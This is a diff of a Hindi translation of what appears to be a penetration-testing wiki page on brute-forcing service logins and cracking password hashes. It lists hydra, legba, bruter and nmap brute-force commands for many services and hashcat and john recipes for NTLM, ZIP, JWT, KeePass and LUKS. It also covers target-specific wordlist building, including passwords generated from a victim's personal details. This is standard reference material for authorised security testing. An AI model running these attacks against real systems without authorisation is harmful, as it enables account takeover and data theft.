@@ -4,7 +4,7 @@
 
 ## Default Credentials
 
-**Google में खोजें** उस तकनीक के लिए डिफ़ॉल्ट क्रेडेंशियल्स, या **इन लिंक को आजमाएं**:
+**Search in google** उस तकनीक के लिए जितने भी default credentials उपलब्ध हों उन्हें खोजें, या **try these links**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **अपनी खुद की डिक्शनरी बनाएं**
+## **अपने Dictionaries बनाएं**
 
-लक्ष्य के बारे में जितनी संभव हो सके जानकारी प्राप्त करें और एक कस्टम डिक्शनरी बनाएं। उपयोगी उपकरण:
+लक्ष्य के बारे में जितनी अधिक जानकारी एकत्र कर सकें इकट्ठा करें और एक custom dictionary जनरेट करें। निम्न tools मददगार हो सकते हैं:
 
 ### Crunch
 ```bash
@@ -34,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### वेबसाइट आधारित शब्दसूचियाँ
+### वेबसाइट-आधारित wordlists
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -47,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-शिकार के बारे में आपके ज्ञान के आधार पर पासवर्ड उत्पन्न करें (नाम, तिथियाँ...)
+पीड़ित के बारे में आपकी जानकारी (नाम, तारीखें...) के आधार पर पासवर्ड उत्पन्न करें
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-एक शब्द सूची जनरेटर उपकरण, जो आपको शब्दों का एक सेट प्रदान करने की अनुमति देता है, जिससे आपको दिए गए शब्दों से कई भिन्नताएँ बनाने की संभावना मिलती है, एक अद्वितीय और आदर्श शब्द सूची बनाने के लिए जिसका उपयोग एक विशिष्ट लक्ष्य के संबंध में किया जा सके।
+एक wordlist generator tool है जो आपको शब्दों का एक सेट देने की सुविधा देता है, ताकि आप दिए गए शब्दों से कई विविधताएँ बना सकें और किसी विशिष्ट लक्ष्य के लिए एक अनूठी और उपयुक्त wordlist तैयार कर सकें।
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +74,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlists
+### वर्डलिस्ट्स
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,7 +87,7 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Services
+## सेवाएँ
 
 सेवा नाम के अनुसार वर्णानुक्रम में व्यवस्थित।
 
@@ -109,11 +109,17 @@ nmap --script ajp-brute -p 8009 <IP>
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
-### कैसंड्रा
+### Cassandra
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
 legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
+```
+### ClickHouse
+
+[bruter](https://github.com/vflame6/bruter)
+```bash
+bruter clickhouse -u default -p passwords.txt localhost:9000
 ```
 ### CouchDB
 ```bash
@@ -151,12 +157,12 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - पोस्ट फॉर्म
+### HTTP - पोस्ट फ़ॉर्म
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-http**s** के लिए आपको "http-post-form" से "**https-post-form" में बदलना होगा
+http**s** के लिए आपको "http-post-form" से "**https-post-form"** में बदलना होगा
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle
 ```bash
@@ -211,7 +217,7 @@ legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwor
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
 ```
-### मोंगो
+### Mongo
 ```bash
 nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
@@ -278,7 +284,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle_login** का उपयोग करने के लिए **patator** के साथ आपको **install** करने की आवश्यकता है:
+यदि आप **oracle_login** को **patator** के साथ उपयोग करना चाहते हैं, तो आपको **install** करना होगा:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -309,7 +315,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-आप `.deb` पैकेज डाउनलोड कर सकते हैं जिसे [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) से इंस्टॉल किया जा सके।
+आप [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) से इंस्टॉल करने के लिए `.deb` पैकेज डाउनलोड कर सकते हैं।
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -368,6 +374,10 @@ nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
+### SMPP
+```bash
+bruter smpp -u smppclient1 -p passwords.txt localhost:2775
+```
 ### SMTP
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
@@ -381,7 +391,7 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 # With alternative address
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-### SQL सर्वर
+### SQL Server
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -400,17 +410,17 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### कमजोर SSH कुंजी / डेबियन पूर्वानुमानित PRNG
+#### कमजोर SSH keys / Debian पूर्वानुमेय PRNG
 
-कुछ सिस्टम में क्रिप्टोग्राफिक सामग्री उत्पन्न करने के लिए उपयोग किए जाने वाले यादृच्छिक बीज में ज्ञात दोष होते हैं। इसके परिणामस्वरूप कुंजी स्थान में नाटकीय रूप से कमी आ सकती है जिसे [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) जैसे उपकरणों के साथ ब्रूटफोर्स किया जा सकता है। कमजोर कुंजियों के पूर्व-निर्मित सेट भी उपलब्ध हैं जैसे [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)।
+कुछ सिस्टमों में क्रिप्टोग्राफिक सामग्री बनाने में उपयोग किए जाने वाले random seed में ज्ञात कमजोरियाँ होती हैं। इससे keyspace नाटकीय रूप से घट सकता है, जिसे [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) जैसे टूल्स से bruteforced किया जा सकता है। पूर्व-निर्मित weak keys के सेट भी उपलब्ध हैं, जैसे [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ और OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMP टेक्स्ट प्रोटोकॉल एक व्यापक रूप से उपयोग किया जाने वाला मैसेजिंग प्रोटोकॉल है जो **लोकप्रिय मैसेज कतार सेवाओं** जैसे RabbitMQ, ActiveMQ, HornetQ, और OpenMQ के साथ निर्बाध संचार और इंटरैक्शन की अनुमति देता है। यह संदेशों का आदान-प्रदान करने और विभिन्न मैसेजिंग संचालन करने के लिए एक मानकीकृत और कुशल दृष्टिकोण प्रदान करता है।
+STOMP टेक्स्ट प्रोटोकॉल एक व्यापक रूप से उपयोग किया जाने वाला messaging protocol है जो **लोकप्रिय message queueing services के साथ निर्बाध संचार और इंटरैक्शन की अनुमति देता है**, जैसे RabbitMQ, ActiveMQ, HornetQ, और OpenMQ। यह संदेशों के आदान-प्रदान और विभिन्न messaging ऑपरेशनों को करने के लिए एक मानकीकृत और प्रभावी तरीका प्रदान करता है।
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
-### टेलनेट
+### Telnet
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -444,23 +454,23 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-## Local
+## स्थानीय
 
-### Online cracking databases
+### ऑनलाइन cracking डेटाबेस
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 के साथ/बिना ESS/SSP और किसी भी challenge के value के साथ)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, और archives MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes और file hashes)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Hash को ब्रूट फोर्स करने की कोशिश करने से पहले इसे देखें।
+इसे देखें इससे पहले कि आप किसी Hash पर brute force करने का प्रयास करें।
 
 ### ZIP
 ```bash
@@ -478,10 +488,10 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### ज्ञात स्पष्ट पाठ ज़िप हमला
+#### Known plaintext zip attack
 
-आपको **संकीर्ण ज़िप के अंदर** एक फ़ाइल का **स्पष्ट पाठ** (या स्पष्ट पाठ का एक भाग) जानना आवश्यक है। आप **संकीर्ण ज़िप के अंदर शामिल फ़ाइलों के फ़ाइल नाम और आकार** की जांच कर सकते हैं: **`7z l encrypted.zip`**\
-[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) को रिलीज़ पृष्ठ से डाउनलोड करें।
+आपको **plaintext** (या plaintext का हिस्सा) **एन्क्रिप्टेड zip के अंदर मौजूद किसी फ़ाइल का** जानना होगा। आप एन्क्रिप्टेड zip में **अंदर मौजूद फ़ाइलों के नाम और आकार** की जांच करने के लिए **`7z l encrypted.zip`** चला सकते हैं।\
+डाउनलोड करें [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) रिलीज़ पेज से।
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -515,7 +525,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDF Owner Password
 
-PDF Owner पासवर्ड क्रैक करने के लिए यह देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner password को crack करने के लिए यह देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -529,13 +539,13 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-### NTLM क्रैकिंग
+### NTLM cracking
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
 hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
 ```
-### कीपास
+### Keepass
 ```bash
 sudo apt-get install -y kpcli #Install keepass tools like keepass2john
 keepass2john file.kdbx > hash #The keepass is only using password
@@ -553,7 +563,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 
 #### विधि 1
 
-इंस्टॉल करें: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+इंस्टॉल: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
@@ -586,16 +596,16 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 <figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>
 
-### DPAPI मास्टर कुंजी
+### DPAPI Master Key
 
-Use [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) and then john
+इस्तेमाल करें [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) और फिर john
 
-### ओपन ऑफिस पासवर्ड से सुरक्षित कॉलम
+### Open Office Pwd सुरक्षित कॉलम
 
-यदि आपके पास एक xlsx फ़ाइल है जिसमें एक कॉलम पासवर्ड द्वारा सुरक्षित है, तो आप इसे अनलॉक कर सकते हैं:
+यदि आपके पास ऐसी xlsx फ़ाइल है जिसमें कोई कॉलम पासवर्ड द्वारा सुरक्षित है, तो आप इसे अनप्रोटेक्ट कर सकते हैं:
 
-- **इसे गूगल ड्राइव पर अपलोड करें** और पासवर्ड स्वचालित रूप से हटा दिया जाएगा
-- **मैन्युअल रूप से** इसे **हटाने के लिए**:
+- **google drive पर अपलोड करें** और पासवर्ड स्वतः हटा दिया जाएगा
+- इसे **हटाने** के लिए **मैन्युअल रूप से**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -611,7 +621,7 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-## Tools
+## उपकरण
 
 **Hash उदाहरण:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
@@ -629,31 +639,31 @@ hash-identifier
 
 ### **Wordlist Generation Tools**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** उन्नत कीबोर्ड-वॉक जनरेटर जिसमें कॉन्फ़िगर करने योग्य बेस कैरेक्टर्स, कीमैप और रूट्स होते हैं।
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** उन्नत keyboard-walk जनरेटर जो कॉन्फ़िगर करने योग्य base chars, keymap और routes प्रदान करता है।
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
-### John mutation
+### John म्यूटेशन
 
-_**/etc/john/john.conf**_ को पढ़ें और इसे कॉन्फ़िगर करें
+पढ़ें _**/etc/john/john.conf**_ और इसे कॉन्फ़िगर करें
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat हमले
+#### Hashcat attacks
 
-- **शब्दसूची हमला** (`-a 0`) नियमों के साथ
+- **Wordlist attack** (`-a 0`) रूल्स के साथ
 
-**Hashcat** पहले से ही एक **नियमों वाला फ़ोल्डर** के साथ आता है लेकिन आप [**यहाँ अन्य दिलचस्प नियम पा सकते हैं**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** पहले से ही एक **रूल्स वाली फ़ोल्डर** के साथ आता है लेकिन आप [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules) पा सकते हैं।
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-- **Wordlist combinator** हमला
+- **Wordlist combinator** attack
 
-hashcat के साथ **2 wordlists को 1 में मिलाना** संभव है।\
-यदि सूची 1 में शब्द **"hello"** था और दूसरी में **"world"** और **"earth"** के साथ 2 पंक्तियाँ थीं। शब्द `helloworld` और `helloearth` उत्पन्न होंगे।
+hashcat के साथ **combine 2 wordlists into 1** करना संभव है.\
+यदि सूची 1 में शब्द **"hello"** मौजूद था और दूसरी सूची में **"world"** और **"earth"** वाले 2 लाइनें थीं, तो `helloworld` और `helloearth` शब्द उत्पन्न होंगे।
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -696,7 +706,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-- वर्डलिस्ट + मास्क (`-a 6`) / मास्क + वर्डलिस्ट (`-a 7`) हमला
+- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) attack
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -704,23 +714,23 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Hashcat मोड
+#### Hashcat मोड्स
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-लिनक्स हैश को क्रैक करना - /etc/shadow फ़ाइल
+Cracking Linux Hashes - /etc/shadow फ़ाइल
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Windows हैश को क्रैक करना
+Cracking Windows Hashes
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-सामान्य एप्लिकेशन हैश को क्रैक करना
+Cracking सामान्य एप्लिकेशन Hashes
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
